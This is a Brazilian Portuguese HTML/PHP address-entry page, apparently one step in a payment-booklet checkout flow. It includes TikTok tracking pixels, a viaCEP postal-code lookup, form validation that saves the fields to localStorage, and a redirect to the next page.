<!DOCTYPE html>
<html lang="pt-BR">
<head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Endereço</title>


<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>
<script>
  window.tikTokPixelId = "6917a5ff97e4b1e2a6541a7a";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
  document.head.appendChild(a);
</script>
<!-- TikTok Pixel Code Start -->
<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};


  ttq.load('D4BQAE3C77UD6NKP6AK0');
  ttq.page();
}(window, document, 'ttq');
</script>
<!-- TikTok Pixel Code End -->



    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'mp-blue': '#009EE3',
                        'mp-dark-blue': '#0074A8',
                        'mp-light-blue': '#E6F7FF',
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        main {
            flex: 1;
        }

        .fade-in {
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(15px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .form-input:focus {
            border-color: #009EE3;
            box-shadow: 0 0 0 3px rgba(0, 158, 227, 0.1);
        }
    </style>
</head>
<body class="bg-gray-50">
    <?php include 'header.php'; ?>

    <main class="py-8 px-4 md:py-12">
        <div class="max-w-xl mx-auto">
            <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 fade-in">
                <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">Endereço para correspondência</h1>
                <p class="text-gray-600 mb-8">
                    Informe seu endereço para envio do carnê das parcelas. Você também receberá uma cópia por e-mail.
                </p>

                <form id="form-endereco">
                    <div class="space-y-5">
                        <div>
                            <label for="cep" class="block text-sm font-medium text-gray-700 mb-2">CEP</label>
                            <input
                                type="text"
                                id="cep"
                                placeholder="00000-000"
                                maxlength="9"
                                onblur="buscarCEP()"
                                class="form-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none transition-all"
                            >
                        </div>

                        <div id="endereco-completo">
                            <div class="mb-5">
                                <label for="rua" class="block text-sm font-medium text-gray-700 mb-2">Rua</label>
                                <input
                                    type="text"
                                    id="rua"
                                    class="form-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none transition-all"
                                >
                                <div class="mensagem-erro text-red-600 text-sm mt-1 hidden"></div>
                            </div>

                            <div class="grid grid-cols-2 gap-4 mb-5">
                                <div>
                                    <label for="numero" class="block text-sm font-medium text-gray-700 mb-2">Número</label>
                                    <input
                                        type="text"
                                        id="numero"
                                        class="form-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none transition-all"
                                    >
                                </div>

                                <div>
                                    <label for="complemento" class="block text-sm font-medium text-gray-700 mb-2">Complemento</label>
                                    <input
                                        type="text"
                                        id="complemento"
                                        placeholder="Opcional"
                                        class="form-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none transition-all"
                                    >
                                </div>
                            </div>

                            <div class="mb-5">
                                <label for="bairro" class="block text-sm font-medium text-gray-700 mb-2">Bairro</label>
                                <input
                                    type="text"
                                    id="bairro"
                                    class="form-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none transition-all"
                                >
                                <div class="mensagem-erro text-red-600 text-sm mt-1 hidden"></div>
                            </div>

                            <div class="grid grid-cols-2 gap-4 mb-8">
                                <div>
                                    <label for="cidade" class="block text-sm font-medium text-gray-700 mb-2">Cidade</label>
                                    <input
                                        type="text"
                                        id="cidade"
                                        class="form-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none transition-all"
                                    >
                                </div>

                                <div>
                                    <label for="estado" class="block text-sm font-medium text-gray-700 mb-2">Estado</label>
                                    <select
                                        id="estado"
                                        class="form-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none transition-all"
                                    >
                                        <option value="AC">AC</option>
                                        <option value="AL">AL</option>
                                        <option value="AP">AP</option>
                                        <option value="AM">AM</option>
                                        <option value="BA">BA</option>
                                        <option value="CE">CE</option>
                                        <option value="DF">DF</option>
                                        <option value="ES">ES</option>
                                        <option value="GO">GO</option>
                                        <option value="MA">MA</option>
                                        <option value="MT">MT</option>
                                        <option value="MS">MS</option>
                                        <option value="MG">MG</option>
                                        <option value="PA">PA</option>
                                        <option value="PB">PB</option>
                                        <option value="PR">PR</option>
                                        <option value="PE">PE</option>
                                        <option value="PI">PI</option>
                                        <option value="RJ">RJ</option>
                                        <option value="RN">RN</option>
                                        <option value="RS">RS</option>
                                        <option value="RO">RO</option>
                                        <option value="RR">RR</option>
                                        <option value="SC">SC</option>
                                        <option value="SP">SP</option>
                                        <option value="SE">SE</option>
                                        <option value="TO">TO</option>
                                    </select>
                                </div>
                            </div>

                            <button
                                type="submit"
                                id="continuarAg"
                                class="w-full bg-mp-blue text-white py-3.5 rounded-lg font-semibold hover:bg-mp-dark-blue hover:shadow-lg transition-all"
                            >
                                Continuar
                            </button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </main>

    <?php include 'footer.php'; ?>

    <script>
        document.getElementById('cep').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 8) value = value.slice(0, 8);
            e.target.value = value.replace(/(\d{5})(\d{3})/, '$1-$2');
        });

        function buscarCEP() {
            const cep = document.getElementById('cep').value.replace(/\D/g, '');
            if (cep.length === 8) {
                fetch(`https://viacep.com.br/ws/${cep}/json/`)
                    .then(response => response.json())
                    .then(data => {
                        if (!data.erro) {
                            document.getElementById('rua').value = data.logradouro;
                            document.getElementById('bairro').value = data.bairro;
                            document.getElementById('cidade').value = data.localidade;
                            document.getElementById('estado').value = data.uf;

                            try {
                                localStorage.setItem('rua', data.logradouro);
                                localStorage.setItem('bairro', data.bairro);
                                localStorage.setItem('cidade', data.localidade);
                                localStorage.setItem('estado', data.uf);
                                localStorage.setItem('cep', cep);
                            } catch(e) {
                                console.warn('localStorage error:', e);
                            }
                        } else {
                            alert('CEP não encontrado.');
                        }
                    })
                    .catch(error => {
                        alert('Erro ao buscar CEP.');
                        console.error('Erro:', error);
                    });
            }
        }

        document.getElementById('form-endereco').addEventListener('submit', function(event) {
            event.preventDefault();

            const rua = document.getElementById('rua');
            const bairro = document.getElementById('bairro');
            const numero = document.getElementById('numero');
            const complemento = document.getElementById('complemento');
            const cidade = document.getElementById('cidade');
            const estado = document.getElementById('estado');
            const cep = document.getElementById('cep');
            let formValido = true;

            function mostrarErro(campo, mensagem) {
                const mensagemErro = campo.parentNode.querySelector('.mensagem-erro');
                if (mensagemErro) {
                    mensagemErro.textContent = mensagem;
                    mensagemErro.classList.remove('hidden');
                }
                campo.classList.add('border-red-500');
                formValido = false;
            }

            function limparErros(campo) {
                campo.classList.remove('border-red-500');
                const erroAnterior = campo.parentNode.querySelector('.mensagem-erro');
                if (erroAnterior) {
                    erroAnterior.classList.add('hidden');
                }
            }

            limparErros(rua);
            limparErros(bairro);

            if (rua.value.trim() === '') {
                mostrarErro(rua, 'Por favor, preencha este campo.');
            }

            if (bairro.value.trim() === '') {
                mostrarErro(bairro, 'Por favor, preencha este campo.');
            }

            if (formValido) {
                try {
                    localStorage.setItem('rua', rua.value.trim());
                    localStorage.setItem('numero', numero.value.trim());
                    localStorage.setItem('complemento', complemento.value.trim());
                    localStorage.setItem('bairro', bairro.value.trim());
                    localStorage.setItem('cidade', cidade.value.trim());
                    localStorage.setItem('estado', estado.value);
                    localStorage.setItem('cep', cep.value.trim());
                } catch(e) {
                    console.warn('localStorage error:', e);
                }

                const urlParams = new URLSearchParams(window.location.search);
               window.location.href = `7.php?${urlParams.toString()}`;
            }
        });
    </script>
</body>
</html>
